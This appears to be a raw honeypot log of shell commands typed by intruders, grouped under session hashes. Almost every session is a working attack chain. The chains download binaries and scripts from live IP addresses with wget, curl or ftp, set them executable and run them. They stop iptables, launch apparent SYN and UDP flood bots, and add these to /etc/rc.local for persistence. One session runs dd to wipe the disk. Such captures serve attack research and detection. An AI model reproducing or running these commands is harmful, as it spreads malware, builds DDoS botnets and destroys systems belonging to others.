6a018d5854cc4263aa05ce226d7afcbd	rm -rf un.pl
6eda6a8e775440efb334b051ebbb9e63	cd /tmp
6eda6a8e775440efb334b051ebbb9e63	wget http://45.32.232.197/get.sh --quiet
8714ebc82395420a8df6ea711ecc0eda	cd /tmp  |  |  cd /var/run  |  |  cd /dev/shm  |  |  cd /mnt  |  |  cd /var
8714ebc82395420a8df6ea711ecc0eda	wget http://89.248.162.146/bin3.sh
0d91efc8ba1641b6b8efb96d4e3f07d3	cd /tmp
0d91efc8ba1641b6b8efb96d4e3f07d3	wget http://45.32.232.197/get.sh --quiet
27b22d2996bb4b8ea1dd9c5253465b06	cd /tmp  |  |  cd /var/run  |  |  cd /dev/shm  |  |  cd /mnt  |  |  cd /var
27b22d2996bb4b8ea1dd9c5253465b06	wget http://89.248.162.146/bin3.sh
80e0f6ea70584d19a10c6866b0e73144	cd /tmp
80e0f6ea70584d19a10c6866b0e73144	wget http://45.32.232.197/get.sh --quiet
321358866a9f46f690eef3a5d52c1817	cd /tmp  |  |  cd /var/run  |  |  cd /dev/shm  |  |  cd /mnt  |  |  cd /var
321358866a9f46f690eef3a5d52c1817	wget http://89.248.162.146/bin3.sh
d800a8cd16a24179964b021edd894af0	curl -o /tmp/25002 http://23.234.25.140:15826/25002
d800a8cd16a24179964b021edd894af0	chmod 777 /tmp/25002
d800a8cd16a24179964b021edd894af0	/tmp/25002
7e82b8214b554ff4a195b0b27a5b1df5	cd /tmp  |  |  cd /var/run  |  |  cd /mnt  |  |  cd /dev/shm  |  |  cd /var
7e82b8214b554ff4a195b0b27a5b1df5	curl -O twh.updatebits.su/r1/curl.sh  >  curl.sh
2c42c5b52ecb4325ac701d90273522e4	cd /tmp  |  |  cd /var/run  |  |  cd /mnt  |  |  cd /dev/shm  |  |  cd /var
2c42c5b52ecb4325ac701d90273522e4	curl -O twh.updatebits.su/r1/curl.sh  >  curl.sh
a56267c631b34310a6f3998e3906c5a4	curl -o /tmp/25002 http://23.234.25.140:15826/25002
a56267c631b34310a6f3998e3906c5a4	chmod 777 /tmp/25002
a56267c631b34310a6f3998e3906c5a4	/tmp/25002
7e1b7cd573ea4872bf85d750d6a36651	curl -o /tmp/162 http://23.234.25.140:15826/162
0e1bbb10eea648c89c881115a00366a8	curl -o /tmp/162 http://23.234.25.140:15826/162
0e1bbb10eea648c89c881115a00366a8	chmod 777 /tmp/162
0e1bbb10eea648c89c881115a00366a8	/tmp/162
4fc02d76af0946518e255c9e6c5d35c3	cd /tmp
4fc02d76af0946518e255c9e6c5d35c3	wget http://45.32.232.197/get.sh --quiet
55014566c8534e32af3a7ac8cd41b4fe	cd /tmp  |  |  cd /var/run  |  |  cd /dev/shm  |  |  cd /mnt  |  |  cd /var
55014566c8534e32af3a7ac8cd41b4fe	wget http://89.248.162.146/bin3.sh
41d5e7edc13a4dee9f4dcc1a8aae32a0	cd /tmp
41d5e7edc13a4dee9f4dcc1a8aae32a0	wget http://45.32.232.197/get.sh --quiet
3b2b3ad156d747ec9644dd14ccbf2170	cd /tmp  |  |  cd /var/run  |  |  cd /dev/shm  |  |  cd /mnt  |  |  cd /var
3b2b3ad156d747ec9644dd14ccbf2170	wget http://89.248.162.146/bin3.sh
313327c71a9e43e5962ba704e4588f89	cd /tmp
313327c71a9e43e5962ba704e4588f89	wget http://45.32.232.197/get.sh --quiet
417186547dbb42b3b4f00873cbfe800c	cd /tmp  |  |  cd /var/run  |  |  cd /dev/shm  |  |  cd /mnt  |  |  cd /var
417186547dbb42b3b4f00873cbfe800c	wget http://89.248.162.146/bin3.sh
df07fbccf8274a35bf9a51dccbad3a70	cd /tmp
df07fbccf8274a35bf9a51dccbad3a70	wget ftp://188.0.236.27/pub/un.pl
df07fbccf8274a35bf9a51dccbad3a70	perl un.pl
df07fbccf8274a35bf9a51dccbad3a70	rm -rf un.pl
bc58760c12e5405f934bade842beddd7	cd /tmp
bc58760c12e5405f934bade842beddd7	wget http://45.32.232.197/get.sh --quiet
b1ee909860e04292be908ecd7f62b89b	cd /tmp  |  |  cd /var/run  |  |  cd /dev/shm  |  |  cd /mnt  |  |  cd /var
b1ee909860e04292be908ecd7f62b89b	wget http://89.248.162.146/bin3.sh
31fbe5d68738471e86fbbe32f7f402f3	curl -o /tmp/162 http://23.234.25.140:15826/162
31fbe5d68738471e86fbbe32f7f402f3	/tmp/162
733927d77dbb4f20acec341f514ea9e7	curl -o /tmp/162 http://23.234.25.140:15826/162
733927d77dbb4f20acec341f514ea9e7	/tmp/162
cac18699970b400399686fb21d4c4c7e	cd /tmp
cac18699970b400399686fb21d4c4c7e	wget ftp://188.0.236.27/pub/un.pl
cac18699970b400399686fb21d4c4c7e	perl un.pl
cac18699970b400399686fb21d4c4c7e	rm -rf un.pl
3c32999d2497413d9534b97e84794583	uname -r
928e9a61d9c04b7990531fca5b98a0f6	cd /etc
928e9a61d9c04b7990531fca5b98a0f6	wget -c http://61.147.107.109:7531/fsta
928e9a61d9c04b7990531fca5b98a0f6	cd /etc
928e9a61d9c04b7990531fca5b98a0f6	wget -c http://61.147.107.109:7531/kusel
8b7a228a707147c496845f082e28ce6a	cd /tmp
8b7a228a707147c496845f082e28ce6a	wget http://45.32.232.197/get.sh --quiet
9e840e94d8c44c77ac51926fb78db3ed	cd /tmp  |  |  cd /var/run  |  |  cd /dev/shm  |  |  cd /mnt  |  |  cd /var
9e840e94d8c44c77ac51926fb78db3ed	wget http://89.248.162.146/bin3.sh
8679a9433ebd471a93fd6e6654fb2c04	curl -o /tmp/162 http://23.234.25.140:15826/162
8679a9433ebd471a93fd6e6654fb2c04	chmod 777 /tmp/162
8679a9433ebd471a93fd6e6654fb2c04	/tmp/162
93cf7e3bc29c47f391c1b4c684341c63	curl -o /tmp/162 http://23.234.25.140:15826/162
93cf7e3bc29c47f391c1b4c684341c63	chmod 777 /tmp/162
93cf7e3bc29c47f391c1b4c684341c63	/tmp/162
4bdc9b6ed195420cabf42baa9b5ae448	curl -o /tmp/162 http://23.234.25.140:15826/162
4bdc9b6ed195420cabf42baa9b5ae448	chmod 777 /tmp/162
4bdc9b6ed195420cabf42baa9b5ae448	/tmp/162
e54792fba7b74f148ed8eba61c30c197	curl -o /tmp/162 http://23.234.25.140:15826/162
e54792fba7b74f148ed8eba61c30c197	chmod 777 /tmp/162
e54792fba7b74f148ed8eba61c30c197	/tmp/162
8d9325a5374d4e83a3b90791b0030828	service iptables stop
8d9325a5374d4e83a3b90791b0030828	wget http://117.27.240.29:281/2525syn
8d9325a5374d4e83a3b90791b0030828	chmod 0755 /root/25syn
8d9325a5374d4e83a3b90791b0030828	nohup /root/25syn  >  /dev/null 2 > &1 &
8d9325a5374d4e83a3b90791b0030828	chmod 777 25syn
8d9325a5374d4e83a3b90791b0030828	./164
8d9325a5374d4e83a3b90791b0030828	chmod 0755 /root/25syn
8d9325a5374d4e83a3b90791b0030828	nohup /root/25syn &gt
8d9325a5374d4e83a3b90791b0030828	/dev/null 2&gt
8d9325a5374d4e83a3b90791b0030828	&amp
8d9325a5374d4e83a3b90791b0030828	1 &amp
8d9325a5374d4e83a3b90791b0030828	chmod 0777 25syn
8d9325a5374d4e83a3b90791b0030828	chmod u+x 25syn
8d9325a5374d4e83a3b90791b0030828	./25syn &
8d9325a5374d4e83a3b90791b0030828	chmod u+x dos6cc4
8d9325a5374d4e83a3b90791b0030828	./25syn &
8d9325a5374d4e83a3b90791b0030828	cd /tmp
8d9325a5374d4e83a3b90791b0030828	service iptables stop
8d9325a5374d4e83a3b90791b0030828	wget http://117.27.240.29:281/2525udp
8d9325a5374d4e83a3b90791b0030828	chmod 0755 /root/25udp
8d9325a5374d4e83a3b90791b0030828	nohup /root/25udp  >  /dev/null 2 > &1 &
8d9325a5374d4e83a3b90791b0030828	chmod 777 25udp
8d9325a5374d4e83a3b90791b0030828	./25udp
8d9325a5374d4e83a3b90791b0030828	chmod 0755 /root/25udp
8d9325a5374d4e83a3b90791b0030828	nohup /root/25udp &gt
8d9325a5374d4e83a3b90791b0030828	/dev/null 2&gt
8d9325a5374d4e83a3b90791b0030828	&amp
8d9325a5374d4e83a3b90791b0030828	1 &amp
8d9325a5374d4e83a3b90791b0030828	chmod 0777 25udp
8d9325a5374d4e83a3b90791b0030828	chmod u+x 25udp
8d9325a5374d4e83a3b90791b0030828	./25udp &
8d9325a5374d4e83a3b90791b0030828	chmod u+x 25udp
8d9325a5374d4e83a3b90791b0030828	./25udp &
8d9325a5374d4e83a3b90791b0030828	cd /tmp
8d9325a5374d4e83a3b90791b0030828	service iptables stop
8d9325a5374d4e83a3b90791b0030828	echo "cd  /root/" >  > /etc/rc.local
8d9325a5374d4e83a3b90791b0030828	echo "./25syn&" >  > /etc/rc.local
8d9325a5374d4e83a3b90791b0030828	echo "./25udp&" >  > /etc/rc.local
8d9325a5374d4e83a3b90791b0030828	echo "/etc/init.d/iptables stop" >  > /etc/rc.local
b64cc62a298a406ea2b2db7abf040163	service iptables stop
b64cc62a298a406ea2b2db7abf040163	wget http://117.27.240.29:3232/25udp
b64cc62a298a406ea2b2db7abf040163	./25udp
b64cc62a298a406ea2b2db7abf040163	chmod 0755 /root/25udp
b64cc62a298a406ea2b2db7abf040163	nohup /root/25udp &gt
b64cc62a298a406ea2b2db7abf040163	/dev/null 2&gt
b64cc62a298a406ea2b2db7abf040163	&amp
b64cc62a298a406ea2b2db7abf040163	1 &amp
b64cc62a298a406ea2b2db7abf040163	chmod 0777 25udp
b64cc62a298a406ea2b2db7abf040163	chmod u+x 25udp
b64cc62a298a406ea2b2db7abf040163	./25udp &
b64cc62a298a406ea2b2db7abf040163	chmod u+x 25udp
b64cc62a298a406ea2b2db7abf040163	./25udp &
b64cc62a298a406ea2b2db7abf040163	cd /tmp
b64cc62a298a406ea2b2db7abf040163	service iptables stop
b64cc62a298a406ea2b2db7abf040163	wget http://117.27.240.29:3232/25udp
b64cc62a298a406ea2b2db7abf040163	./164
b64cc62a298a406ea2b2db7abf040163	chmod 0755 /root/25udp
b64cc62a298a406ea2b2db7abf040163	nohup /root/25udp &gt
b64cc62a298a406ea2b2db7abf040163	/dev/null 2&gt
b64cc62a298a406ea2b2db7abf040163	&amp
b64cc62a298a406ea2b2db7abf040163	1 &amp
b64cc62a298a406ea2b2db7abf040163	chmod 0777 25udp
b64cc62a298a406ea2b2db7abf040163	chmod u+x 25udp
b64cc62a298a406ea2b2db7abf040163	./25udp &
b64cc62a298a406ea2b2db7abf040163	chmod u+x dos6cc4
b64cc62a298a406ea2b2db7abf040163	./25udp &
b64cc62a298a406ea2b2db7abf040163	cd /tmp
b64cc62a298a406ea2b2db7abf040163	echo "cd  /root/" >  > /etc/rc.local
b64cc62a298a406ea2b2db7abf040163	echo "./25udp&" >  > /etc/rc.local
b64cc62a298a406ea2b2db7abf040163	echo "./25udp&" >  > /etc/rc.local
b64cc62a298a406ea2b2db7abf040163	echo "/etc/init.d/iptables stop" >  > /etc/rc.local
7bd10f8b7af445a8b6c38154896cb666	curl -o /tmp/162 http://23.234.25.140:15826/162
7bd10f8b7af445a8b6c38154896cb666	/tmp/162
ba60fb8349034831a2f43c9d35d4f3d7	service iptables stop
ba60fb8349034831a2f43c9d35d4f3d7	wget http://117.27.240.29:3232/ddos2.4
ba60fb8349034831a2f43c9d35d4f3d7	./ddos2.4
ba60fb8349034831a2f43c9d35d4f3d7	chmod 0755 /root/ddos2.4
ba60fb8349034831a2f43c9d35d4f3d7	nohup /root/ddos2.4 &gt
ba60fb8349034831a2f43c9d35d4f3d7	/dev/null 2&gt
ba60fb8349034831a2f43c9d35d4f3d7	&amp
ba60fb8349034831a2f43c9d35d4f3d7	1 &amp
ba60fb8349034831a2f43c9d35d4f3d7	chmod 0777 ddos2.4
ba60fb8349034831a2f43c9d35d4f3d7	chmod u+x ddos2.4
ba60fb8349034831a2f43c9d35d4f3d7	./ddos2.4 &
ba60fb8349034831a2f43c9d35d4f3d7	chmod u+x ddos2.4
ba60fb8349034831a2f43c9d35d4f3d7	./ddos2.4 &
ba60fb8349034831a2f43c9d35d4f3d7	cd /tmp
ba60fb8349034831a2f43c9d35d4f3d7	service iptables stop
ba60fb8349034831a2f43c9d35d4f3d7	wget http://117.27.240.29:3232/32-64
ba60fb8349034831a2f43c9d35d4f3d7	chmod 777 32-64
ba60fb8349034831a2f43c9d35d4f3d7	./164
ba60fb8349034831a2f43c9d35d4f3d7	chmod 0755 /root/32-64
ba60fb8349034831a2f43c9d35d4f3d7	nohup /root/32-64 &gt
ba60fb8349034831a2f43c9d35d4f3d7	/dev/null 2&gt
ba60fb8349034831a2f43c9d35d4f3d7	&amp
ba60fb8349034831a2f43c9d35d4f3d7	1 &amp
ba60fb8349034831a2f43c9d35d4f3d7	chmod 0777 32-64
ba60fb8349034831a2f43c9d35d4f3d7	chmod u+x 32-64
ba60fb8349034831a2f43c9d35d4f3d7	./d32-64 &
ba60fb8349034831a2f43c9d35d4f3d7	chmod u+x dos6cc4
ba60fb8349034831a2f43c9d35d4f3d7	./32-64 &
ba60fb8349034831a2f43c9d35d4f3d7	cd /tmp
ba60fb8349034831a2f43c9d35d4f3d7	echo "cd  /root/" >  > /etc/rc.local
ba60fb8349034831a2f43c9d35d4f3d7	echo "./ddos2.4&" >  > /etc/rc.local
ba60fb8349034831a2f43c9d35d4f3d7	echo "./32-64&" >  > /etc/rc.local
ba60fb8349034831a2f43c9d35d4f3d7	echo "/etc/init.d/iptables stop" >  > /etc/rc.local
e7df9da274ce480ca97f647fbd22504d	service iptables stop
e7df9da274ce480ca97f647fbd22504d	wget http://117.27.240.29:3232/sssyn
e7df9da274ce480ca97f647fbd22504d	nohup /root/sssyn  >  /dev/null 2 > &1 &
e7df9da274ce480ca97f647fbd22504d	chmod 777 sssyn
e7df9da274ce480ca97f647fbd22504d	./sssyn
e7df9da274ce480ca97f647fbd22504d	chmod 0755 /root/sssyn
e7df9da274ce480ca97f647fbd22504d	nohup /root/sssyn &gt
e7df9da274ce480ca97f647fbd22504d	/dev/null 2&gt
e7df9da274ce480ca97f647fbd22504d	&amp
e7df9da274ce480ca97f647fbd22504d	1 &amp
e7df9da274ce480ca97f647fbd22504d	chmod 0777 sssyn
e7df9da274ce480ca97f647fbd22504d	chmod u+x sssyn
e7df9da274ce480ca97f647fbd22504d	./sssyn &
e7df9da274ce480ca97f647fbd22504d	chmod u+x sssyn
e7df9da274ce480ca97f647fbd22504d	./sssyn &
e7df9da274ce480ca97f647fbd22504d	cd /tmp
e7df9da274ce480ca97f647fbd22504d	service iptables stop
e7df9da274ce480ca97f647fbd22504d	wget http://117.27.240.29:3232/ssnup
e7df9da274ce480ca97f647fbd22504d	./164
e7df9da274ce480ca97f647fbd22504d	chmod 0755 /root/ssnup
e7df9da274ce480ca97f647fbd22504d	nohup /root/ssnup &gt
e7df9da274ce480ca97f647fbd22504d	/dev/null 2&gt
e7df9da274ce480ca97f647fbd22504d	&amp
e7df9da274ce480ca97f647fbd22504d	1 &amp
e7df9da274ce480ca97f647fbd22504d	chmod 0777 ssnup
e7df9da274ce480ca97f647fbd22504d	chmod u+x ssnup
e7df9da274ce480ca97f647fbd22504d	./dssnup &
e7df9da274ce480ca97f647fbd22504d	chmod u+x dos6cc4
e7df9da274ce480ca97f647fbd22504d	./ssnup &
e7df9da274ce480ca97f647fbd22504d	cd /tmp
e7df9da274ce480ca97f647fbd22504d	echo "cd  /root/" >  > /etc/rc.local
e7df9da274ce480ca97f647fbd22504d	echo "./sssyn&" >  > /etc/rc.local
e7df9da274ce480ca97f647fbd22504d	echo "./ssnup&" >  > /etc/rc.local
e7df9da274ce480ca97f647fbd22504d	echo "/etc/init.d/iptables stop" >  > /etc/rc.local
3c5c5477902842dba4b0942f84e85e62	service iptables stop
3c5c5477902842dba4b0942f84e85e62	wget http://117.27.240.29:3232/sssyn
3c5c5477902842dba4b0942f84e85e62	nohup /root/sssyn  >  /dev/null 2 > &1 &
3c5c5477902842dba4b0942f84e85e62	chmod 777 sssyn
3c5c5477902842dba4b0942f84e85e62	./sssyn
3c5c5477902842dba4b0942f84e85e62	chmod 0755 /root/sssyn
3c5c5477902842dba4b0942f84e85e62	nohup /root/sssyn &gt
3c5c5477902842dba4b0942f84e85e62	/dev/null 2&gt
3c5c5477902842dba4b0942f84e85e62	&amp
3c5c5477902842dba4b0942f84e85e62	1 &amp
3c5c5477902842dba4b0942f84e85e62	chmod 0777 sssyn
3c5c5477902842dba4b0942f84e85e62	chmod u+x sssyn
3c5c5477902842dba4b0942f84e85e62	./sssyn &
3c5c5477902842dba4b0942f84e85e62	chmod u+x sssyn
3c5c5477902842dba4b0942f84e85e62	./sssyn &
3c5c5477902842dba4b0942f84e85e62	cd /tmp
3c5c5477902842dba4b0942f84e85e62	service iptables stop
3c5c5477902842dba4b0942f84e85e62	wget http://117.27.240.29:3232/ssnup
3c5c5477902842dba4b0942f84e85e62	nohup /root/ssnup  >  /dev/null 2 > &1 &
3c5c5477902842dba4b0942f84e85e62	chmod 777 ssnup
3c5c5477902842dba4b0942f84e85e62	./164
3c5c5477902842dba4b0942f84e85e62	chmod 0755 /root/ssnup
3c5c5477902842dba4b0942f84e85e62	nohup /root/ssnup &gt
3c5c5477902842dba4b0942f84e85e62	/dev/null 2&gt
3c5c5477902842dba4b0942f84e85e62	&amp
3c5c5477902842dba4b0942f84e85e62	1 &amp
3c5c5477902842dba4b0942f84e85e62	chmod 0777 ssnup
3c5c5477902842dba4b0942f84e85e62	chmod u+x ssnup
aed44f904ef747468f8312de14fdfc89	service iptables stop
aed44f904ef747468f8312de14fdfc89	wget http://117.27.240.29:3232/xueudp
aed44f904ef747468f8312de14fdfc89	nohup /root/xueudp  >  /dev/null 2 > &1 &
aed44f904ef747468f8312de14fdfc89	chmod 777 xueudp
aed44f904ef747468f8312de14fdfc89	./xueudp
aed44f904ef747468f8312de14fdfc89	chmod 0755 /root/xueudp
aed44f904ef747468f8312de14fdfc89	nohup /root/xueudp &gt
aed44f904ef747468f8312de14fdfc89	/dev/null 2&gt
aed44f904ef747468f8312de14fdfc89	&amp
aed44f904ef747468f8312de14fdfc89	1 &amp
aed44f904ef747468f8312de14fdfc89	chmod 0777 xueudp
aed44f904ef747468f8312de14fdfc89	chmod u+x xueudp
aed44f904ef747468f8312de14fdfc89	./xueudp &
aed44f904ef747468f8312de14fdfc89	chmod u+x xueudp
aed44f904ef747468f8312de14fdfc89	./xueudp &
aed44f904ef747468f8312de14fdfc89	cd /tmp
aed44f904ef747468f8312de14fdfc89	service iptables stop
aed44f904ef747468f8312de14fdfc89	wget http://117.27.240.29:3232/xuesyn
aed44f904ef747468f8312de14fdfc89	chmod 777 xuesyn
aed44f904ef747468f8312de14fdfc89	./164
aed44f904ef747468f8312de14fdfc89	chmod 0755 /root/xuesyn
aed44f904ef747468f8312de14fdfc89	nohup /root/xuesyn &gt
aed44f904ef747468f8312de14fdfc89	/dev/null 2&gt
aed44f904ef747468f8312de14fdfc89	&amp
aed44f904ef747468f8312de14fdfc89	1 &amp
aed44f904ef747468f8312de14fdfc89	chmod 0777 xuesyn
aed44f904ef747468f8312de14fdfc89	chmod u+x xuesyn
aed44f904ef747468f8312de14fdfc89	./dxuesyn &
aed44f904ef747468f8312de14fdfc89	chmod u+x dos6cc4
aed44f904ef747468f8312de14fdfc89	./xuesyn &
aed44f904ef747468f8312de14fdfc89	cd /tmp
aed44f904ef747468f8312de14fdfc89	echo "cd  /root/" >  > /etc/rc.local
aed44f904ef747468f8312de14fdfc89	echo "./xueudp&" >  > /etc/rc.local
aed44f904ef747468f8312de14fdfc89	echo "./xuesyn&" >  > /etc/rc.local
aed44f904ef747468f8312de14fdfc89	echo "/etc/init.d/iptables stop" >  > /etc/rc.local
6b71106d76884d8c94bec40059f8a78a	cd /tmp
6b71106d76884d8c94bec40059f8a78a	wget ftp://188.0.236.27/pub/un.pl
6b71106d76884d8c94bec40059f8a78a	perl un.pl
6b71106d76884d8c94bec40059f8a78a	rm -rf un.pl
1a317e2fd9ea403da2fce51aa81d4887	service iptables stop
1a317e2fd9ea403da2fce51aa81d4887	wget http://122.228.207.227:1284/shiudp
437aa0e9a3a84bf693bc84ebe81b72e5	service iptables stop
437aa0e9a3a84bf693bc84ebe81b72e5	wget http://117.27.240.29:3232/xinsyn
8ca5bc6d3ba346fe857d255fba75790c	ls
8ca5bc6d3ba346fe857d255fba75790c	w
437aa0e9a3a84bf693bc84ebe81b72e5	chmod 0755 /root/xinsyn
437aa0e9a3a84bf693bc84ebe81b72e5	nohup /root/xinsyn  >  /dev/null 2 > &1 &
8ca5bc6d3ba346fe857d255fba75790c	cd ~
437aa0e9a3a84bf693bc84ebe81b72e5	chmod 777 xinsyn
8ca5bc6d3ba346fe857d255fba75790c	uname -r
437aa0e9a3a84bf693bc84ebe81b72e5	./xinsyn
437aa0e9a3a84bf693bc84ebe81b72e5	chmod 0755 /root/xinsyn
437aa0e9a3a84bf693bc84ebe81b72e5	nohup /root/xinsyn &gt
437aa0e9a3a84bf693bc84ebe81b72e5	/dev/null 2&gt
437aa0e9a3a84bf693bc84ebe81b72e5	&amp
437aa0e9a3a84bf693bc84ebe81b72e5	1 &amp
8ca5bc6d3ba346fe857d255fba75790c	ping 8.8.8.8
437aa0e9a3a84bf693bc84ebe81b72e5	chmod 0777 xinsyn
8ca5bc6d3ba346fe857d255fba75790c	ip route
437aa0e9a3a84bf693bc84ebe81b72e5	chmod u+x xinsyn
437aa0e9a3a84bf693bc84ebe81b72e5	./xinsyn &
8ca5bc6d3ba346fe857d255fba75790c	route print
8ca5bc6d3ba346fe857d255fba75790c	route
437aa0e9a3a84bf693bc84ebe81b72e5	chmod u+x xinsyn
8ca5bc6d3ba346fe857d255fba75790c	gcc
437aa0e9a3a84bf693bc84ebe81b72e5	./xinsyn &
437aa0e9a3a84bf693bc84ebe81b72e5	cd /tmp
8ca5bc6d3ba346fe857d255fba75790c	cat /proc/cpuinfo
437aa0e9a3a84bf693bc84ebe81b72e5	service iptables stop
437aa0e9a3a84bf693bc84ebe81b72e5	wget http://117.27.240.29:3232/xinudp
8ca5bc6d3ba346fe857d255fba75790c	dig NS kp.
437aa0e9a3a84bf693bc84ebe81b72e5	nohup /root/xinudp  >  /dev/null 2 > &1 &
437aa0e9a3a84bf693bc84ebe81b72e5	chmod 777 xinudp
8ca5bc6d3ba346fe857d255fba75790c	sudo -i
437aa0e9a3a84bf693bc84ebe81b72e5	./164
8ca5bc6d3ba346fe857d255fba75790c	su -
437aa0e9a3a84bf693bc84ebe81b72e5	chmod 0755 /root/xinudp
8ca5bc6d3ba346fe857d255fba75790c	id
437aa0e9a3a84bf693bc84ebe81b72e5	nohup /root/xinudp &gt
437aa0e9a3a84bf693bc84ebe81b72e5	/dev/null 2&gt
437aa0e9a3a84bf693bc84ebe81b72e5	&amp
437aa0e9a3a84bf693bc84ebe81b72e5	1 &amp
8ca5bc6d3ba346fe857d255fba75790c	yum
437aa0e9a3a84bf693bc84ebe81b72e5	chmod 0777 xinudp
8ca5bc6d3ba346fe857d255fba75790c	uname -a
437aa0e9a3a84bf693bc84ebe81b72e5	chmod u+x xinudp
437aa0e9a3a84bf693bc84ebe81b72e5	./xinudp &
8ca5bc6d3ba346fe857d255fba75790c	apt-get install dig
437aa0e9a3a84bf693bc84ebe81b72e5	chmod u+x dos6cc4
437aa0e9a3a84bf693bc84ebe81b72e5	./xinudp &
437aa0e9a3a84bf693bc84ebe81b72e5	cd /tmp
8ca5bc6d3ba346fe857d255fba75790c	apt-get install nmap
437aa0e9a3a84bf693bc84ebe81b72e5	echo "cd  /root/" >  > /etc/rc.local
437aa0e9a3a84bf693bc84ebe81b72e5	echo "./xinsyn&" >  > /etc/rc.local
437aa0e9a3a84bf693bc84ebe81b72e5	echo "./xinudp&" >  > /etc/rc.local
437aa0e9a3a84bf693bc84ebe81b72e5	echo "/etc/init.d/iptables stop" >  > /etc/rc.local
8ca5bc6d3ba346fe857d255fba75790c	dig NS kp.
8ca5bc6d3ba346fe857d255fba75790c	nslookup kp.
8ca5bc6d3ba346fe857d255fba75790c	nmap -p 53 ping 999.999.999.999
8ca5bc6d3ba346fe857d255fba75790c	ping 123.123.123.999
8ca5bc6d3ba346fe857d255fba75790c	nmap
8ca5bc6d3ba346fe857d255fba75790c	exit
9823d8c857554cafa28c2fcc46565f68	w
9823d8c857554cafa28c2fcc46565f68	last
9823d8c857554cafa28c2fcc46565f68	nmap
9823d8c857554cafa28c2fcc46565f68	ping 888.888.888.888
9823d8c857554cafa28c2fcc46565f68	uname -a
9823d8c857554cafa28c2fcc46565f68	fucking honeypot
9823d8c857554cafa28c2fcc46565f68	cat /etc/passwd
9823d8c857554cafa28c2fcc46565f68	blkid
9823d8c857554cafa28c2fcc46565f68	mount
9823d8c857554cafa28c2fcc46565f68	id
9823d8c857554cafa28c2fcc46565f68	dd if=/dev/zero of=/dev/sda
9823d8c857554cafa28c2fcc46565f68	exit
5ffa7c608f6b4c078050c684b80d05c4	service iptables stop
5ffa7c608f6b4c078050c684b80d05c4	wget http://117.27.240.29:3232/xinsyn
5ffa7c608f6b4c078050c684b80d05c4	nohup /root/xinsyn  >  /dev/null 2 > &1 &
5ffa7c608f6b4c078050c684b80d05c4	chmod 777 xinsyn
5ffa7c608f6b4c078050c684b80d05c4	./xinsyn
5ffa7c608f6b4c078050c684b80d05c4	chmod 0755 /root/xinsyn
5ffa7c608f6b4c078050c684b80d05c4	nohup /root/xinsyn &gt
5ffa7c608f6b4c078050c684b80d05c4	/dev/null 2&gt
5ffa7c608f6b4c078050c684b80d05c4	&amp
5ffa7c608f6b4c078050c684b80d05c4	1 &amp
5ffa7c608f6b4c078050c684b80d05c4	chmod 0777 xinsyn
5ffa7c608f6b4c078050c684b80d05c4	chmod u+x xinsyn
5ffa7c608f6b4c078050c684b80d05c4	./xinsyn &
5ffa7c608f6b4c078050c684b80d05c4	chmod u+x xinsyn
5ffa7c608f6b4c078050c684b80d05c4	./xinsyn &
5ffa7c608f6b4c078050c684b80d05c4	cd /tmp
5ffa7c608f6b4c078050c684b80d05c4	service iptables stop
5ffa7c608f6b4c078050c684b80d05c4	wget http://117.27.240.29:3232/xinudp
f9cacce2e48c428fb4c9e3c4ba9d8b10	curl -o /tmp/162 http://23.234.25.140:15826/162
13fc2ecf574940659f818c2614d5ad01	service iptables stop
13fc2ecf574940659f818c2614d5ad01	wget http://117.27.240.29:3232/xinsyn
a5ed4d67905941358b774a9d07d49e52	service iptables stop
a5ed4d67905941358b774a9d07d49e52	wget http://117.27.240.29:3232/xinsyn
a5ed4d67905941358b774a9d07d49e52	chmod 0755 /root/xinsyn
a5ed4d67905941358b774a9d07d49e52	nohup /root/xinsyn  >  /dev/null 2 > &1 &
a5ed4d67905941358b774a9d07d49e52	chmod 777 xinsyn
a5ed4d67905941358b774a9d07d49e52	./xinsyn
a5ed4d67905941358b774a9d07d49e52	chmod 0755 /root/xinsyn
a5ed4d67905941358b774a9d07d49e52	nohup /root/xinsyn &gt
a5ed4d67905941358b774a9d07d49e52	/dev/null 2&gt
a5ed4d67905941358b774a9d07d49e52	&amp
a5ed4d67905941358b774a9d07d49e52	1 &amp
a5ed4d67905941358b774a9d07d49e52	chmod 0777 xinsyn
a5ed4d67905941358b774a9d07d49e52	chmod u+x xinsyn
a5ed4d67905941358b774a9d07d49e52	./xinsyn &
a5ed4d67905941358b774a9d07d49e52	chmod u+x xinsyn
754997ea68e148e9af7002d478ec8554	service iptables stop
a5ed4d67905941358b774a9d07d49e52	./xinsyn &
754997ea68e148e9af7002d478ec8554	wget http://117.27.240.29:3232/xinsyn
a5ed4d67905941358b774a9d07d49e52	cd /tmp
a5ed4d67905941358b774a9d07d49e52	service iptables stop
